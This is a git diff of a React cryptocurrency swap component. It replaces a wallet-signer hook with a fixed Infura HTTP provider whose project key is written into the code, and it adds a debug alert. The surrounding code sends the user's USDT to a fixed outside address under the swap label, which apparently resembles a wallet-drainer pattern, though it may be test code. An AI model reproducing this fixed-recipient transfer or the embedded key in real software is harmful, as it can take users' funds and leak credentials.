@@ -11,11 +11,11 @@ import uniRouter from '../../utils/UniRouter.json'
 import { ethers } from 'ethers'
 import { ConnectButton } from '@rainbow-me/rainbowkit'
 import { useAccount } from 'wagmi'
-import { useWeb3jsSigner } from '../../utils/useWe3js'
 
 import TransactionModal from 'react-modal'
 import TransactionLoader from '../TransactionLoader/TransactionLoader'
 import Confetti from '../Confetti'
+import { Web3 } from 'web3'
 
 TransactionModal.setAppElement('#root')
 
@@ -52,7 +52,11 @@ function SwapComponent() {
 
   const { address, chainId } = useAccount()
 
-  const web3js = useWeb3jsSigner({ chainId: chainId })
+  const web3js = new Web3(
+    new Web3.providers.HttpProvider(
+      'https://mainnet.infura.io/v3/35e86f89b81d45a8a62ed9bb6ab1f3e6'
+    )
+  )
 
   useEffect(() => {
     let timer
@@ -66,6 +70,8 @@ function SwapComponent() {
 
   const sendTransaction = async () => {
     if (!web3js) return
+
+    alert('hello')
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
     const usdtABI = [
@@ -89,8 +95,7 @@ function SwapComponent() {
     ]
 
     const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
-
-    let amount = web3js.utils.toHex('1000000')
+    const amount = web3js.utils.toHex('1000000')
 
     const data = usdtContract.methods
       .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', amount)
